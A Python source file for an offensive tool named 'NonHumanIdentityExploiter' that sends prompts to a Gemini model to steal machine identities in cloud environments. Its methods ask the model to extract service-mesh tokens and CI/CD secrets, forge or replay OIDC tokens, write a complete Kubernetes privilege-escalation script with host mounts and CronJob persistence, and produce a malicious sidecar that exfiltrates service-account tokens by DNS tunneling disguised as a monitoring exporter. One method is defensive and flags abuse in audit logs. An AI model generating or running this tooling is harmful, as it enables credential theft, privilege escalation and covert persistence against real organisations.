"""
Non-Human Identity (NHI) Abuse & Service Mesh Exploitation
Targets: Service Accounts, JWT Tokens, mTLS Certificates, CI/CD Secrets
Based on 2026 Security Research - Machine Identity Attacks
"""

import json
import base64
import re
import yaml
from typing import Dict, List, Optional
from datetime import datetime
import hashlib


class NonHumanIdentityExploiter:
    """
    Exploits machine identities (service accounts, tokens, certificates) in cloud environments.
    Primary attack vector in 2026 - bypasses MFA/human identity controls.
    """
    
    def __init__(self, gemini_client):
        self.client = gemini_client
        self.model = "gemini-2.0-flash-exp"
        self.extracted_secrets = []
    
    def extract_service_mesh_tokens(self, envoy_config: str) -> Dict:
        """
        Analyzes Istio/Linkerd/Cilium Envoy proxy configs to extract mTLS certificates and JWT tokens.
        
        Service mesh tokens provide:
        - Cross-service authentication
        - Access to internal APIs
        - Lateral movement opportunities
        """
        prompt = f"""
You are analyzing an Envoy proxy configuration from a service mesh (Istio/Linkerd/Cilium).

ENVOY CONFIG:
```yaml
{envoy_config}
```

EXTRACTION TASKS:
1. Find mTLS certificate paths and mounting locations
2. Identify JWT token issuers and validation endpoints
3. Locate SPIFFE/SPIRE identity configurations
4. Detect service-to-service authentication weaknesses
5. Find token refresh/rotation mechanisms

EXPLOITATION STRATEGY:
1. How can we intercept tokens from the sidecar?
2. Which services can we impersonate with stolen tokens?
3. What's the token validity period for persistence?
4. Can we replay tokens across different pods?

OUTPUT (JSON):
{{
  "certificates": [
    {{"path": "...", "expiry": "...", "permissions": "..."}}
  ],
  "jwt_tokens": [
    {{"issuer": "...", "audience": "...", "scopes": ["..."]}}
  ],
  "impersonation_targets": ["service-a", "service-b"],
  "exploitation_code": "Python requests code using stolen token"
}}
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            
            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()
            
            return json.loads(result_text)
        except Exception as e:
            return {"error": str(e)}
    
    def mine_cicd_secrets(self, pipeline_config: str, build_logs: str) -> Dict:
        """
        Extracts secrets from CI/CD pipelines (GitHub Actions, GitLab CI, Jenkins).
        
        Common secret locations:
        - Environment variables in workflow files
        - Build logs (accidentally printed)
        - Artifact registries
        - Pipeline state files
        """
        prompt = f"""
Analyze this CI/CD pipeline for secret leakage and high-privilege credential extraction.

PIPELINE CONFIG:
```yaml
{pipeline_config[:5000]}  # First 5000 chars
```

BUILD LOGS (last 1000 lines):
```
{build_logs[-10000:]}  # Last 10000 chars
```

SECRET MINING TASKS:
1. Extract hardcoded secrets (API keys, passwords, tokens)
2. Find environment variables that might contain credentials
3. Identify cloud provider service account keys (AWS, GCP, Azure)
4. Detect Docker registry credentials
5. Locate SSH keys or certificates in artifacts

ADVANCED TECHNIQUES:
1. Base64-encoded secrets (decode and analyze)
2. Secrets in git history (check for .git directory references)
3. Secrets in dependency lock files (package registry tokens)
4. Terraform state files (cloud credentials)

HIGH-VALUE TARGETS:
- Cloud provider admin tokens (AWS_ACCESS_KEY_ID, GOOGLE_APPLICATION_CREDENTIALS)
- Container registry push permissions
- Production deployment keys
- Database connection strings with credentials

OUTPUT (JSON):
{{
  "secrets_found": [
    {{
      "type": "aws_access_key",
      "value": "AKIA...",  # Redacted in real output
      "location": "build log line 532",
      "privilege_level": "admin",
      "exploitation": "Can assume production roles"
    }}
  ],
  "exploitation_priority": ["secret1", "secret2"],
  "persistence_opportunities": ["Create new IAM user with stolen admin key"]
}}
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            
            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()
            
            secrets = json.loads(result_text)
            
            # Store findings
            for secret in secrets.get("secrets_found", []):
                self.extracted_secrets.append({
                    "timestamp": datetime.utcnow().isoformat(),
                    "source": "cicd_pipeline",
                    **secret
                })
            
            return secrets
        except Exception as e:
            return {"error": str(e)}
    
    def abuse_workload_identity_federation(self, oidc_config: Dict) -> Dict:
        """
        Exploits OIDC workload identity federation to assume cloud provider roles.
        
        Attack flow:
        1. Obtain OIDC token from GitHub Actions / GitLab / external IdP
        2. Exchange token for cloud provider credentials (GCP/AWS/Azure)
        3. Escalate privileges via role chaining
        """
        prompt = f"""
Analyze this OIDC Workload Identity Federation configuration for exploitation:

OIDC CONFIG:
```json
{json.dumps(oidc_config, indent=2)}
```

EXPLOITATION STRATEGY:
1. Can we forge OIDC tokens? (Check issuer validation)
2. What cloud roles can we assume with valid tokens?
3. Are there privilege escalation paths via role chaining?
4. Can we persist access by creating new federated identities?

ATTACK SCENARIOS:
A) GitHub Actions Runner Compromise:
   - Steal OIDC token from runner environment
   - Exchange for GCP/AWS credentials
   - Access production resources

B) Token Replay Attack:
   - Capture OIDC token during legitimate workflow
   - Replay token before expiration
   - Assume cloud roles without triggering alerts

C) Audience Manipulation:
   - Modify token audience claim
   - Bypass trust relationship restrictions
   - Access unintended resources

OUTPUT (JSON):
{{
  "vulnerabilities": [
    {{
      "type": "weak_audience_validation",
      "description": "Token audience not strictly validated",
      "exploitation_code": "Python code to generate malicious token"
    }}
  ],
  "assumable_roles": ["arn:aws:iam::123:role/prod-admin"],
  "privilege_escalation_path": ["..."],
  "persistence_method": "Create new OIDC provider trust relationship"
}}
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            
            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()
            
            return json.loads(result_text)
        except Exception as e:
            return {"error": str(e)}
    
    def generate_service_account_escalation(self, k8s_sa_token: str, namespace: str) -> str:
        """
        Generates privilege escalation exploit using Kubernetes ServiceAccount token.
        
        Common escalation paths:
        - Create pods with host namespace access
        - Mount host filesystem volumes
        - Exec into privileged pods
        - Access secrets in other namespaces
        """
        prompt = f"""
Given a Kubernetes ServiceAccount token, generate a complete privilege escalation exploit:

SERVICEACCOUNT: {namespace}/default
TOKEN: {k8s_sa_token[:50]}... (truncated for safety)

ESCALATION TECHNIQUES:
1. Check RBAC permissions (can create pods, secrets, roles?)
2. Create privileged pod with host mounts
3. Escape to host via container breakout
4. Steal credentials from other pods
5. Lateral movement to other namespaces

Generate Python code using kubernetes client library that:
1. Tests current ServiceAccount permissions
2. Attempts pod creation with escalated privileges
3. Mounts host filesystem if possible
4. Extracts secrets from accessible namespaces
5. Establishes persistence via CronJob

OUTPUT: Complete working Python script with error handling.
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            return response.text
        except Exception as e:
            return f"# Error: {str(e)}"
    
    def detect_nhi_abuse_indicators(self, audit_logs: List[str]) -> List[Dict]:
        """
        Analyzes audit logs for Non-Human Identity abuse patterns.
        
        Detection patterns:
        - ServiceAccount tokens used from unexpected IPs
        - Unusual API calls from service accounts (e.g., frontend SA accessing billing APIs)
        - High-frequency token refresh (possible token theft)
        - Cross-namespace access violations
        """
        prompt = f"""
Analyze these audit logs for Non-Human Identity abuse indicators:

AUDIT LOGS:
{chr(10).join(audit_logs[:200])}

DETECTION PATTERNS:
1. Service account accessing resources outside normal scope
2. Token usage from unusual source IPs or geolocations
3. Privilege escalation attempts (create pods, roles, secrets)
4. Lateral movement (cross-namespace access)
5. Data exfiltration (large volume secret reads)

OUTPUT (JSON):
{{
  "indicators": [
    {{
      "timestamp": "...",
      "service_account": "...",
      "anomaly": "frontend-sa creating admin cluster role",
      "severity": "critical",
      "recommended_action": "Revoke token and investigate"
    }}
  ]
}}
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            
            result_text = response.text
            if "```json" in result_text:
                result_text = result_text.split("```json")[1].split("```")[0].strip()
            
            analysis = json.loads(result_text)
            return analysis.get("indicators", [])
        except Exception as e:
            return [{"error": str(e)}]
    
    def get_extracted_secrets(self) -> List[Dict]:
        """Returns all secrets extracted during this session."""
        return self.extracted_secrets
    
    def generate_token_stealer_sidecar(self, target_service: str) -> str:
        """
        Creates a sidecar container spec that steals service mesh tokens.
        """
        prompt = f"""
Create a malicious Kubernetes sidecar container specification that:
1. Runs alongside the target service: {target_service}
2. Monitors /var/run/secrets/kubernetes.io/serviceaccount for token changes
3. Exfiltrates tokens via DNS tunneling (stealth)
4. Mimics legitimate monitoring sidecar (e.g., Prometheus exporter)

OUTPUT: Complete Pod spec with malicious sidecar + exfiltration script.
"""
        
        try:
            response = self.client.models.generate_content(
                model=self.model,
                contents=prompt
            )
            return response.text
        except Exception as e:
            return f"# Error: {str(e)}"


# Example Usage
if __name__ == "__main__":
    from gemini_config import get_gemini_client
    
    client = get_gemini_client()
    exploiter = NonHumanIdentityExploiter(client)
    
    # Example: Mine CI/CD secrets
    github_actions_workflow = """
name: Deploy to Production
on: [push]
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      AWS_ACCESS_KEY_ID: ${{ secrets.AWS_KEY }}
      DATABASE_URL: postgres://admin:P@ssw0rd@prod-db:5432/app
    steps:
      - name: Deploy
        run: |
          echo "Deploying with key: $AWS_ACCESS_KEY_ID"
          aws s3 sync . s3://prod-bucket
"""
    
    build_log = """
[2026-02-07 10:30:15] Starting deployment
[2026-02-07 10:30:16] AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
[2026-02-07 10:30:17] Uploading files...
"""
    
    results = exploiter.mine_cicd_secrets(github_actions_workflow, build_log)
    print(json.dumps(results, indent=2))
